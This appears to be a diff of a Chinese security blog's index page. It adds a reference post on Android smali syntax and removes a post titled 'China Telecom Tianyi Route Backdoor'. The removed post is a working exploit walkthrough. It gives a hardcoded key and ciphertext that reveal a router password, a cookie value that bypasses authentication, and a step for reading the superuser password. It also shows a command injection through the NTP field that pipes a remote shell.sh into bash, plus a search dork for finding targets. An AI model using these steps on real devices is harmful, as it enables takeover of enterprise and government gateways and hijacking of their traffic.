@@ -263,6 +263,404 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/09/22/smali-wiki/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/09/22/smali-wiki/" itemprop="url">
+                  smali wiki
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-22T15:08:16+08:00">
+                2016-09-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-TypesMethodsAndFields"><a href="#0x01-TypesMethodsAndFields" class="headerlink" title="0x01 TypesMethodsAndFields"></a>0x01 TypesMethodsAndFields</h3><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><blockquote>
+<p><strong>原始类型</strong></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>value</th>
+<th>description </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>V</td>
+<td>void - can only be used for return types</td>
+</tr>
+<tr>
+<td>Z</td>
+<td>boolean</td>
+</tr>
+<tr>
+<td>B</td>
+<td>byte</td>
+</tr>
+<tr>
+<td>S</td>
+<td>short</td>
+</tr>
+<tr>
+<td>C</td>
+<td>char</td>
+</tr>
+<tr>
+<td>I</td>
+<td>int</td>
+</tr>
+<tr>
+<td>J</td>
+<td>long (64 bits)</td>
+</tr>
+<tr>
+<td>F</td>
+<td>float</td>
+</tr>
+<tr>
+<td>D</td>
+<td>double (64 bits)</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>对象</strong></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lpackage/name/ObjectName;   &lt;==&gt; package.name.ObjectName;</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>value</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>L</td>
+<td>表示这是一个对象类型</td>
+</tr>
+<tr>
+<td>package/name</td>
+<td>该对象所在的包</td>
+</tr>
+<tr>
+<td>ObjectName</td>
+<td>对象名称</td>
+</tr>
+<tr>
+<td>;</td>
+<td>标识对象名称的结束</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>数组</strong></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[|          ==&gt; 表示一个int型的一维数组，相当于int[]</span><br><span class="line">[[|         ==&gt; int[][]，数组每一个维度最多255个;</span><br><span class="line">对象数组    ==&gt; 如String数组的表示是[Ljava/lang/String</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>寄存器与变量</strong></p>
+</blockquote>
+<p>寄存器采用v和p来命名,v表示本地寄存器,p表示参数寄存器,如果一个方法有两个本地变量，有三个参数:</p>
+<table>
+<thead>
+<tr>
+<th>var</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>v0</td>
+<td>第一个本地寄存器</td>
+</tr>
+<tr>
+<td>v1</td>
+<td>第二个本地寄存器</td>
+</tr>
+<tr>
+<td>v2</td>
+<td>p0 (this)</td>
+</tr>
+<tr>
+<td>v3</td>
+<td>p1 第一个参数</td>
+</tr>
+<tr>
+<td>v4</td>
+<td>p2 第二个参数</td>
+</tr>
+<tr>
+<td>v5</td>
+<td>p3 第三个参数</td>
+</tr>
+</tbody>
+</table>
+<p>＊如果是静态方法的话就只有5个寄存器了，不需要存this了。</p>
+<p>.registers 使用这个指令指定方法中寄存器的总数</p>
+<p>.locals 使用这个指定表明方法中非参寄存器的总数，放在方法的第一行。</p>
+<h4 id="方法和字段"><a href="#方法和字段" class="headerlink" title="方法和字段"></a>方法和字段</h4><blockquote>
+<p><strong>方法签名</strong></p>
+</blockquote>
+<p>methodName(III)Lpackage/name/ObjectName;</p>
+<table>
+<thead>
+<tr>
+<th>var</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>methodName</td>
+<td>方法名</td>
+</tr>
+<tr>
+<td>III</td>
+<td>三个整形参数</td>
+</tr>
+<tr>
+<td>Lpackage/name/ObjectName;</td>
+<td>返回值的类型</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>方法</strong></p>
+</blockquote>
+<p>Lpackage/name/ObjectName;——&gt;methodName(III)Z    ==&gt; function boolean methondName(int a, int b, int c)</p>
+<blockquote>
+<p><strong>字段</strong></p>
+</blockquote>
+<p>Lpackage/name/ObjectName;——&gt;FieldName:Ljava/lang/String;</p>
+<table>
+<thead>
+<tr>
+<th>var</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Lpackage/name/ObjectName;</td>
+<td>包名</td>
+</tr>
+<tr>
+<td>FieldName</td>
+<td>字段名</td>
+</tr>
+<tr>
+<td>Ljava/lang/String;</td>
+<td>字段类型</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>方法的定义</strong></p>
+</blockquote>
+<p><strong>编译前</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static int sum(int a, int b) &#123;</span><br><span class="line">        return a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><strong>编译后</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.method private static sum(II)I</span><br><span class="line">    .locals 4   #表示需要申请4个本地寄存器</span><br><span class="line">    .parameter</span><br><span class="line">    .parameter #这里表示有两个参数</span><br><span class="line">    .prologue</span><br><span class="line">    .line 27 </span><br><span class="line">    move v0, p0</span><br><span class="line">    .local v0, a:I</span><br><span class="line">    move v1, p1</span><br><span class="line">    .local v1, b:I</span><br><span class="line">    move v2, v0</span><br><span class="line">    move v3, v1</span><br><span class="line">    add-int/2addr v2, v3</span><br><span class="line">    move v0, v2</span><br><span class="line">    .end local v0           #a:I</span><br><span class="line">    return v0</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure></p>
+<p>函数声明使用.method开始 .end method结束，java中的关键词private,static 等都可以使用，同时使用sum(II)I签名来表示唯一的方法</p>
+<blockquote>
+<p><strong>声明成员</strong></p>
+</blockquote>
+<p>.field private name:Lpackage/name/ObjectName;</p>
+<table>
+<thead>
+<tr>
+<th>var</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>private TextView mTextView;</td>
+<td>.field private mTextView:Landroid/widget/TextView;</td>
+</tr>
+<tr>
+<td>private int mCount;</td>
+<td>.field private mCount:I</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>指令执行</strong></p>
+</blockquote>
+<p>example:</p>
+<p>move v0, v3     #把v3寄存器的值移动到寄存器v0上</p>
+<p>const v0, 0x1  #把值0x1赋值到寄存器v0上</p>
+<p>invoke-static {v4, v5}, Lme/isming/myapplication/MainActivity;-&gt;sum(II)I    </p>
+<p>#执行方法sum(),v4,v5的值分别作为sum的参数</p>
+<h3 id="0x02-smali基本语法"><a href="#0x02-smali基本语法" class="headerlink" title="0x02 smali基本语法"></a>0x02 smali基本语法</h3><table>
+<thead>
+<tr>
+<th>value</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>.field private isFlag:z　</td>
+<td>　定义变量</td>
+</tr>
+<tr>
+<td>.method　</td>
+<td>　方法</td>
+</tr>
+<tr>
+<td>.parameter　</td>
+<td>　方法参数</td>
+</tr>
+<tr>
+<td>.prologue　</td>
+<td>　方法开始</td>
+</tr>
+<tr>
+<td>.line 12　</td>
+<td>　此方法位于第12行</td>
+</tr>
+<tr>
+<td>invoke-super　</td>
+<td>　调用父函数</td>
+</tr>
+<tr>
+<td>const/high16  v0, 0x7fo3　</td>
+<td>　把0x7fo3赋值给v0</td>
+</tr>
+<tr>
+<td>invoke-direct　</td>
+<td>　调用函数</td>
+</tr>
+<tr>
+<td>return-void　</td>
+<td>　函数返回void</td>
+</tr>
+<tr>
+<td>.end method　</td>
+<td>　函数结束</td>
+</tr>
+<tr>
+<td>new-instance　</td>
+<td>　创建实例</td>
+</tr>
+<tr>
+<td>iput-object　</td>
+<td>　对象赋值</td>
+</tr>
+<tr>
+<td>iget-object　</td>
+<td>　调用对象</td>
+</tr>
+<tr>
+<td>invoke-static　</td>
+<td>　调用静态函数</td>
+</tr>
+</tbody>
+</table>
+<h3 id="0x03-条件跳转分支"><a href="#0x03-条件跳转分支" class="headerlink" title="0x03 条件跳转分支"></a>0x03 条件跳转分支</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&quot;if-eq vA, vB, :cond_**&quot;   如果vA等于vB则跳转到:cond_**</span><br><span class="line">&quot;if-ne vA, vB, :cond_**&quot;   如果vA不等于vB则跳转到:cond_**</span><br><span class="line">&quot;if-lt vA, vB, :cond_**&quot;    如果vA小于vB则跳转到:cond_**</span><br><span class="line">&quot;if-ge vA, vB, :cond_**&quot;   如果vA大于等于vB则跳转到:cond_**</span><br><span class="line">&quot;if-gt vA, vB, :cond_**&quot;   如果vA大于vB则跳转到:cond_**</span><br><span class="line">&quot;if-le vA, vB, :cond_**&quot;    如果vA小于等于vB则跳转到:cond_**</span><br><span class="line">&quot;if-eqz vA, :cond_**&quot;   如果vA等于0则跳转到:cond_**</span><br><span class="line">&quot;if-nez vA, :cond_**&quot;   如果vA不等于0则跳转到:cond_**</span><br><span class="line">&quot;if-ltz vA, :cond_**&quot;    如果vA小于0则跳转到:cond_**</span><br><span class="line">&quot;if-gez vA, :cond_**&quot;   如果vA大于等于0则跳转到:cond_**</span><br><span class="line">&quot;if-gtz vA, :cond_**&quot;   如果vA大于0则跳转到:cond_**</span><br><span class="line">&quot;if-lez vA, :cond_**&quot;    如果vA小于等于0则跳转到:cond_**</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
   <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/09/22/Android-Encrypt-and-Decrypt/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1703,133 +2101,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/07/04/China-Telecom-Tianyi-Route-Backdoor/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/07/04/China-Telecom-Tianyi-Route-Backdoor/" itemprop="url">
-                  China Telecom Tianyi Route Backdoor
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-07-04T23:37:24+08:00">
-                2016-07-04
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>电信天意宽带政企平台是电信给政府和企业做的一款设备（外包给中兴做的），其包括VPN、用户上网行为管理等功能。覆盖全上海乃至南方数个城市数万企业与政府网关设备，通过这个后门可直接获取路由器超级管理员账号密码，并取得路由器系统root权限，进而劫持企业内部流量。</p>
-<h3 id="访问地址"><a href="#访问地址" class="headerlink" title="访问地址"></a>访问地址</h3><blockquote>
-<p>后台地址图标为天翼宽带，地址如下：</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:port/set/index.html</span><br></pre></td></tr></table></figure>
-<h3 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">key:</span><br><span class="line">    123456789abcdef03456789abcdef01256789abcdef01234789abcdef0123456</span><br><span class="line">Data:</span><br><span class="line">    820ff917fff0407f6dc8d69e09c78723</span><br></pre></td></tr></table></figure>
-<p><a href="http://extranet.cryptomathic.com/aescalc/index" target="_blank" rel="external">解密地址</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Output:</span><br><span class="line">    636F6E66696700000000000000000000</span><br><span class="line">hex decode:</span><br><span class="line">    config      //password</span><br></pre></td></tr></table></figure></p>
-<h3 id="添加Cookie字段值"><a href="#添加Cookie字段值" class="headerlink" title="添加Cookie字段值"></a>添加Cookie字段值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bizstore_note=zte</span><br></pre></td></tr></table></figure>
-<h3 id="获取超级管理员密码"><a href="#获取超级管理员密码" class="headerlink" title="获取超级管理员密码"></a>获取超级管理员密码</h3><p>编辑telecomadmin用户右击审查元素查看密码值</p>
-<h3 id="命令执行反弹shell"><a href="#命令执行反弹shell" class="headerlink" title="命令执行反弹shell"></a>命令执行反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">系统管理 &gt;&gt; 时间管理 &gt;&gt; NTP服务器1: `curl http://**.**.**.**/shell.sh | bash`</span><br></pre></td></tr></table></figure>
-<h3 id="Google-search"><a href="#Google-search" class="headerlink" title="Google search"></a>Google search</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intitle:管理平台登陆</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1875,7 +2146,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">84</span>
+              <span class="site-state-item-count">85</span>
               <span class="site-state-item-name">posts</span>
             </a>
           </div>
@@ -1885,7 +2156,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">65</span>
+                <span class="site-state-item-count">66</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
